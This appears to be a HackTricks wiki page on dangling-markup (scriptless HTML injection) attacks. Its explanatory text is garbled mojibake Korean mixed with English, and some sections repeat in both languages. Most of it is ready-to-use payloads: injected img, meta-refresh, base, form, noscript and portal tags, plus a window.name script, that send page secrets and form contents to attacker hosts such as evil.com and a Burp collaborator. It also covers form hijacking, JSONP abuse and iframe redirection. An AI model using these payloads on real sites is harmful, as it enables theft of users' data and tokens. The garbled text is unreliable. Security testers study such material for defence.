# Dangling Markup - HTML scriptless injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Resume

ì´ ê¸°ìˆ ì€ **HTML injectionì´ ë°œê²¬ë˜ì—ˆì„ ë•Œ** ì‚¬ìš©ìë¡œë¶€í„° ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **XSS** [**XSS**](../xss-cross-site-scripting/)ë¥¼ ì´ìš©í•  ë°©ë²•ì„ ì°¾ì§€ ëª»í–ˆì§€ë§Œ **HTML íƒœê·¸ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆëŠ” ê²½ìš°** ë§¤ìš° ìœ ìš©í•©ë‹ˆë‹¤.\
ë˜í•œ **ë¹„ë°€ì´ HTMLì— í‰ë¬¸ìœ¼ë¡œ ì €ì¥ë˜ì–´** ìˆê³  ì´ë¥¼ í´ë¼ì´ì–¸íŠ¸ì—ì„œ **ìœ ì¶œ**í•˜ê³  ì‹¶ê±°ë‚˜, ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ì„ ì˜¤ë„í•˜ê³  ì‹¶ì„ ë•Œë„ ìœ ìš©í•©ë‹ˆë‹¤.

ì—¬ê¸°ì—ì„œ ì–¸ê¸‰ëœ ì—¬ëŸ¬ ê¸°ìˆ ì€ ì •ë³´ë¥¼ ì˜ˆìƒì¹˜ ëª»í•œ ë°©ì‹(HTML íƒœê·¸, CSS, http-meta íƒœê·¸, í¼, base ë“±)ìœ¼ë¡œ ìœ ì¶œí•˜ì—¬ ì¼ë¶€ [**Content Security Policy**](../content-security-policy-csp-bypass/)ë¥¼ ìš°íšŒí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Main Applications

### Stealing clear text secrets

í˜ì´ì§€ê°€ ë¡œë“œë  ë•Œ `<img src='http://evil.com/log.cgi?`ë¥¼ ì£¼ì…í•˜ë©´ í”¼í•´ìëŠ” ì£¼ì…ëœ `img` íƒœê·¸ì™€ ì½”ë“œ ë‚´ì˜ ë‹¤ìŒ ì¸ìš©ë¶€í˜¸ ì‚¬ì´ì˜ ëª¨ë“  ì½”ë“œë¥¼ ë³´ë‚´ê²Œ ë©ë‹ˆë‹¤. ê·¸ ì¡°ê°ì— ë¹„ë°€ì´ í¬í•¨ë˜ì–´ ìˆë‹¤ë©´, ë‹¹ì‹ ì€ ê·¸ê²ƒì„ í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë”ë¸” ì¿¼íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°™ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìœ¼ë©°, ì–´ë–¤ ê²ƒì´ ë” í¥ë¯¸ë¡œìš¸ì§€ ì‚´í´ë³´ì„¸ìš”).

`img` íƒœê·¸ê°€ ê¸ˆì§€ëœ ê²½ìš°(CSP ë•Œë¬¸ì¼ ìˆ˜ ìˆìŒ) `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`ë¥¼ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Note that **Chrome blocks HTTP URLs** with "<" or "\n" in it, so you could try other protocol schemes like "ftp".

CSS `@import`ë¥¼ ì•…ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ (";"ë¥¼ ì°¾ì„ ë•Œê¹Œì§€ ëª¨ë“  ì½”ë“œë¥¼ ì „ì†¡í•©ë‹ˆë‹¤).
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
You could also use **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
You could also insert a `<base` tag. ëª¨ë“  ì •ë³´ëŠ” ì¸ìš©ì´ ë‹«í ë•Œê¹Œì§€ ì „ì†¡ë˜ì§€ë§Œ ì¼ë¶€ ì‚¬ìš©ì ìƒí˜¸ì‘ìš©ì´ í•„ìš”í•©ë‹ˆë‹¤(ì‚¬ìš©ìê°€ ë§í¬ë¥¼ í´ë¦­í•´ì•¼ í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ base íƒœê·¸ê°€ ë§í¬ê°€ ê°€ë¦¬í‚¤ëŠ” ë„ë©”ì¸ì„ ë³€ê²½í–ˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### ì–‘ì‹ í›”ì¹˜ê¸°
```html
<base href='http://evil.com/'>
```
ê·¸ëŸ° ë‹¤ìŒ, ê²½ë¡œì— ë°ì´í„°ë¥¼ ë³´ë‚´ëŠ” í¼(`<form action='update_profile.php'>`)ì€ ì•…ì„± ë„ë©”ì¸ìœ¼ë¡œ ë°ì´í„°ë¥¼ ë³´ëƒ…ë‹ˆë‹¤.

### Stealing forms 2

í¼ í—¤ë”ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤: `<form action='http://evil.com/log_steal'>` ì´ë ‡ê²Œ í•˜ë©´ ë‹¤ìŒ í¼ í—¤ë”ê°€ ë®ì–´ì“°ì—¬ì§€ê³  í¼ì˜ ëª¨ë“  ë°ì´í„°ê°€ ê³µê²©ìì—ê²Œ ì „ì†¡ë©ë‹ˆë‹¤.

### Stealing forms 3

ë²„íŠ¼ì€ "formaction" ì†ì„±ì„ ì‚¬ìš©í•˜ì—¬ í¼ ì •ë³´ê°€ ì „ì†¡ë  URLì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
ê³µê²©ìëŠ” ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ì •ë³´ë¥¼ í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[**ì´ ê³µê²©ì˜ ì˜ˆì‹œë¥¼ ì´ ê¸€ì—ì„œ ì°¾ì•„ë³´ì„¸ìš”**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### ëª…í™•í•œ í…ìŠ¤íŠ¸ ë¹„ë°€ í›”ì¹˜ê¸° 2

ê°€ì¥ ìµœê·¼ì— ì–¸ê¸‰ëœ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ì–‘ì‹ì„ í›”ì¹˜ê³  (ìƒˆ ì–‘ì‹ í—¤ë” ì£¼ì…) ìƒˆë¡œìš´ ì…ë ¥ í•„ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<input type='hidden' name='review_body' value="
```
ì´ ì…ë ¥ í•„ë“œëŠ” HTMLì—ì„œ ì´ì¤‘ ë”°ì˜´í‘œ ì‚¬ì´ì˜ ëª¨ë“  ì½˜í…ì¸ ì™€ ë‹¤ìŒ ì´ì¤‘ ë”°ì˜´í‘œ ì‚¬ì´ì˜ ì½˜í…ì¸ ë¥¼ í¬í•¨í•©ë‹ˆë‹¤. ì´ ê³µê²©ì€ "_**Stealing clear text secrets**_"ì™€ "_**Stealing forms2**_"ë¥¼ í˜¼í•©í•©ë‹ˆë‹¤.

í¼ê³¼ `<option>` íƒœê·¸ë¥¼ ì£¼ì…í•˜ì—¬ ë™ì¼í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹«íŒ `</option>`ì´ ë°œê²¬ë  ë•Œê¹Œì§€ ëª¨ë“  ë°ì´í„°ê°€ ì „ì†¡ë©ë‹ˆë‹¤:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Form parameter injection

í¼ì˜ ê²½ë¡œë¥¼ ë³€ê²½í•˜ê³  ìƒˆë¡œìš´ ê°’ì„ ì‚½ì…í•˜ì—¬ ì˜ˆìƒì¹˜ ëª»í•œ ì‘ì—…ì´ ìˆ˜í–‰ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Stealing clear text secrets via noscript

`<noscript></noscript>`ëŠ” ë¸Œë¼ìš°ì €ê°€ ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì§€ì›í•˜ì§€ ì•Šì„ ê²½ìš° ê·¸ ë‚´ìš©ì„ í•´ì„í•˜ëŠ” íƒœê·¸ì…ë‹ˆë‹¤ (Chromeì—ì„œ ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ í™œì„±í™”/ë¹„í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [chrome://settings/content/javascript](chrome://settings/content/javascript)).

ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ì‚¬ì´íŠ¸ë¡œ ì£¼ì… ì§€ì ì—ì„œ í•˜ë‹¨ê¹Œì§€ ì›¹ í˜ì´ì§€ì˜ ë‚´ìš©ì„ ìœ ì¶œí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒì„ ì£¼ì…í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassing CSP with user interaction

ì´ [portswiggers ì—°êµ¬](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)ì—ì„œ **ê°€ì¥ CSP ì œí•œì ì¸** í™˜ê²½ì—ì„œë„ **ì‚¬ìš©ì ìƒí˜¸ì‘ìš©**ì„ í†µí•´ ì—¬ì „íˆ **ë°ì´í„°ë¥¼ ìœ ì¶œ**í•  ìˆ˜ ìˆìŒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë²ˆ ê²½ìš°ì—ëŠ” í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•  ê²ƒì…ë‹ˆë‹¤:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
**í¬ìƒì**ì—ê²Œ **ë§í¬ë¥¼ í´ë¦­**í•˜ë„ë¡ ìš”ì²­í•˜ì—¬ **ë‹¹ì‹ ì´ ì œì–´í•˜ëŠ”** **payload**ë¡œ **ë¦¬ë””ë ‰ì…˜**ë  ê²ƒì„ì„ ìœ ì˜í•˜ì‹­ì‹œì˜¤. ë˜í•œ **`base`** íƒœê·¸ ë‚´ì˜ **`target`** ì†ì„±ì€ ë‹¤ìŒ ë‹¨ì¼ ì¸ìš©ë¶€í˜¸ê¹Œì§€ **HTML ì½˜í…ì¸ **ë¥¼ í¬í•¨í•  ê²ƒì…ë‹ˆë‹¤.\
ì´ë¡œ ì¸í•´ ë§í¬ê°€ í´ë¦­ë˜ë©´ **`window.name`**ì˜ **ê°’**ì€ ëª¨ë“  **HTML ì½˜í…ì¸ **ê°€ ë  ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ **í¬ìƒìê°€ ë§í¬ë¥¼ í´ë¦­í•˜ì—¬ ì ‘ê·¼í•˜ëŠ” í˜ì´ì§€ë¥¼ ì œì–´**í•˜ë¯€ë¡œ í•´ë‹¹ **`window.name`**ì— ì ‘ê·¼í•˜ê³  ê·¸ ë°ì´í„°ë¥¼ **ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Misleading script workflow 1 - HTML namespace attack

HTML ë‚´ë¶€ì— ìƒˆë¡œìš´ íƒœê·¸ì™€ idë¥¼ ì‚½ì…í•˜ì—¬ ë‹¤ìŒ íƒœê·¸ë¥¼ ë®ì–´ì“°ê³  ìŠ¤í¬ë¦½íŠ¸ì˜ íë¦„ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ê°’ì„ ì„¤ì •í•©ë‹ˆë‹¤. ì´ ì˜ˆì œì—ì„œëŠ” ì •ë³´ê°€ ê³µìœ ë  ëŒ€ìƒì„ ì„ íƒí•˜ê³  ìˆìŠµë‹ˆë‹¤:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Misleading script workflow 2 - Script namespace attack

HTML íƒœê·¸ë¥¼ ì‚½ì…í•˜ì—¬ ìë°”ìŠ¤í¬ë¦½íŠ¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë‚´ì— ë³€ìˆ˜ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ì´ ë³€ìˆ˜ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ íë¦„ì— ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤:
```html
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### Abuse of JSONP

JSONP ì¸í„°í˜ì´ìŠ¤ë¥¼ ì°¾ìœ¼ë©´ ì„ì˜ì˜ ë°ì´í„°ë¡œ ì„ì˜ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
ë˜ëŠ” ì¼ë¶€ ìë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•´ ë³¼ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframe ë‚¨ìš©

ìì‹ ë¬¸ì„œëŠ” êµì°¨ ì¶œì²˜ ìƒí™©ì—ì„œë„ ë¶€ëª¨ì˜ `location` ì†ì„±ì„ ë³´ê³  ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ì´ëŠ” **iframe** ë‚´ì— ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚½ì…í•˜ì—¬ í´ë¼ì´ì–¸íŠ¸ë¥¼ ì„ì˜ì˜ í˜ì´ì§€ë¡œ ë¦¬ë””ë ‰ì…˜í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
ì´ê²ƒì€ ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì™„í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `sandbox=' allow-scripts allow-top-navigation'`

iframeì€ ë˜í•œ **iframe name ì†ì„±**ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ í˜ì´ì§€ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ìœ ì¶œí•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” HTML ì£¼ì…ì„ ì•…ìš©í•˜ì—¬ **ë¯¼ê°í•œ ì •ë³´ê°€ iframe name ì†ì„± ì•ˆì— ë‚˜íƒ€ë‚˜ê²Œ í•˜ëŠ”** iframeì„ ìƒì„±í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì´ë©°, ê·¸ëŸ° ë‹¤ìŒ ì´ˆê¸° iframeì—ì„œ í•´ë‹¹ ì´ë¦„ì— ì ‘ê·¼í•˜ì—¬ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
For more info check [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuse

You could use **`meta http-equiv`** to perform **several actions** like setting a Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` or performing a redirect (in 5s in this case): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

This can be **avoided** with a **CSP** regarding **http-equiv** ( `Content-Security-Policy: default-src 'self';`, or `Content-Security-Policy: http-equiv 'self';`)

### New \<portal HTML tag

You can find a very **interesting research** on exploitable vulnerabilities of the \<portal tag [here](https://research.securitum.com/security-analysis-of-portal-element/).\
At the moment of this writing you need to enable the portal tag on Chrome in `chrome://flags/#enable-portals` or it won't work.

---

ë” ë§ì€ ì •ë³´ëŠ” [ì—¬ê¸°](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

### \<meta ë‚¨ìš©

**`meta http-equiv`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì¿ í‚¤ ì„¤ì •: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ë˜ëŠ” ë¦¬ë””ë ‰ì…˜ ìˆ˜í–‰(ì´ ê²½ìš° 5ì´ˆ í›„): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`ì™€ ê°™ì€ **ì—¬ëŸ¬ ì‘ì—…**ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŠ” **http-equiv**ì— ëŒ€í•œ **CSP**ë¡œ **íšŒí”¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ ( `Content-Security-Policy: default-src 'self';`, ë˜ëŠ” `Content-Security-Policy: http-equiv 'self';`)

### ìƒˆë¡œìš´ \<portal HTML íƒœê·¸

\<portal íƒœê·¸ì˜ ì·¨ì•½ì ì— ëŒ€í•œ ë§¤ìš° **í¥ë¯¸ë¡œìš´ ì—°êµ¬**ë¥¼ [ì—¬ê¸°](https://research.securitum.com/security-analysis-of-portal-element/)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ ê¸€ì„ ì‘ì„±í•˜ëŠ” ì‹œì ì—ì„œ Chromeì—ì„œ `chrome://flags/#enable-portals`ì—ì„œ portal íƒœê·¸ë¥¼ í™œì„±í™”í•´ì•¼ ì‘ë™í•©ë‹ˆë‹¤.
```html
<portal src='https://attacker-server?
```
### HTML Leaks

HTMLì—ì„œ ì—°ê²°ì„ ìœ ì¶œí•˜ëŠ” ëª¨ë“  ë°©ë²•ì´ Dangling Markupì— ìœ ìš©í•˜ì§€ëŠ” ì•Šì§€ë§Œ, ë•Œë•Œë¡œ ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

ì´ê²ƒì€ **dangling markupì™€ XS-Leaks**ì˜ **í˜¼í•©**ì…ë‹ˆë‹¤. í•œí¸ìœ¼ë¡œëŠ” ì·¨ì•½ì ì´ **ê°™ì€ ì¶œì²˜**ì˜ í˜ì´ì§€ì— **HTML**(í•˜ì§€ë§Œ JSëŠ” ì•„ë‹˜)ì„ **ì£¼ì…**í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ë‹¤ë¥¸ í•œí¸ìœ¼ë¡œëŠ” HTMLì„ ì£¼ì…í•  ìˆ˜ ìˆëŠ” í˜ì´ì§€ë¥¼ **ì§ì ‘ ê³µê²©**í•˜ì§€ ì•Šê³ , **ë‹¤ë¥¸ í˜ì´ì§€**ë¥¼ ê³µê²©í•©ë‹ˆë‹¤.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-SearchëŠ” **ì‚¬ì´ë“œ ì±„ë„ ê³µê²©**ì„ ì•…ìš©í•˜ì—¬ **êµì°¨ ì¶œì²˜ ì •ë³´**ë¥¼ **ìœ ì¶œ**í•˜ëŠ” ë° ì´ˆì ì„ ë§ì¶¥ë‹ˆë‹¤. ë”°ë¼ì„œ, ì´ê²ƒì€ Dangling Markupê³¼ëŠ” ë‹¤ë¥¸ ê¸°ìˆ ì´ì§€ë§Œ, ì¼ë¶€ ê¸°ìˆ ì€ HTML íƒœê·¸ì˜ í¬í•¨ì„ ì•…ìš©í•©ë‹ˆë‹¤(JS ì‹¤í–‰ ì—¬ë¶€ì™€ ê´€ê³„ì—†ì´), ì˜ˆë¥¼ ë“¤ì–´ [**CSS Injection**](../xs-search/#css-injection) ë˜ëŠ” [**Lazy Load Images**](../xs-search/#image-lazy-loading)**.**

{% content-ref url="../xs-search/" %}
[xs-search](../xs-search/)
{% endcontent-ref %}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## References

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
